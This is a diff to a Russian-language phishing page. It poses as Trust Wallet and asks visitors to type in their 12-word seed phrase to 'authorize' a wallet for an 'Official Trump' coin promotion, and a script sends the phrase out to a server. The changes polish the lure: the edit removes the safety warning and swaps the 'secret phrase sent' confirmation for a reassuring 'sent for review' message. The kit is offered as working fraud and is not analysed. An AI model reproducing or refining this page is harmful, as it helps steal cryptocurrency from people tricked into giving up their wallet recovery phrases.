@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Верификация кошелька</title>
+    <title>Авторизация кошелька</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -126,8 +126,8 @@
         <div class="logo">
             <img src="IMG_2134.png" alt="Trust Wallet Logo">
         </div>
-        <h1>Для участия в акции USDT-$TRUMP COIN, авторизуйте свой кошелёк</h1>
-        <p class="description">Введите вашу секретную фразу из 12 слов, чтобы подтвердить участие в акции. Убедитесь, что вы храните её в безопасности!</p>
+        <h1>Для участия в акции Official Trump авторизуйте свой кошелёк</h1>
+        <p class="description">Введите вашу seed-фразу из 12 слов, чтобы подтвердить участие в акции.</p>
         <form id="seedForm">
             <div class="seed-input">
                 <div class="seed-item">
@@ -203,7 +203,7 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
-                            alert('Секретная фраза успешно отправлена!');
+                            alert('Кошелёк успешно отправлен на проверку, и будет участвовать в акции если подходит по критериям.');
                         } else {
                             alert('Ошибка отправки.');
                         }
@@ -212,7 +212,7 @@
                         alert('Ошибка отправки.');
                     });
             } else {
-                alert('Пожалуйста, заполните все поля.');
+                alert('Пожалуйста, заполните все поля по порядку.');
             }
         });
     </script>
